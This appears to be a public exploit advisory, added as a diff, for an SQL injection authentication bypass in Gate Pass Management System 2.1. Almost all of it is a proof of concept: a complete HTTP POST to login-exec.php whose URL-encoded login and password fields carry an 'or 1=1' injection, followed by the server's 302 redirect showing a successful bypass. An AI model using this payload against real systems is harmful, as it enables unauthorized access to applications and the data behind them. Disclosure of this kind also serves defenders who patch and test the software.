@@ -1,0 +1,39 @@
+# Exploit Title: Gate Pass Management System 2.1 - 'login' SQL Injection
+# Dork: N/A
+# Date: 2018-11-01
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.livebms.com
+# Software Link: https://netcologne.dl.sourceforge.net/project/gatepass/gpms_Update.zip
+# Version: 2.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/login-exec.php
+# 
+POST /[PATH]/login-exec.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=dfbpcp36b5ura1aurmtm3dqbr0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 119
+login=%27%6f%72%20%31%3d%31%20%6f%72%20%27%27%3d%27&password=%27%6f%72%20%31%3d%31%20%6f%72%20%27%27%3d%27&Submit=Login
+HTTP/1.1 302 Found
+Date: Thu, 01 Nov 2018 12:08:54 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=e7ed7dtjg0hq3qsv0vil80o086; path=/
+Location: gpms/index.php
+Content-Length: 281
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
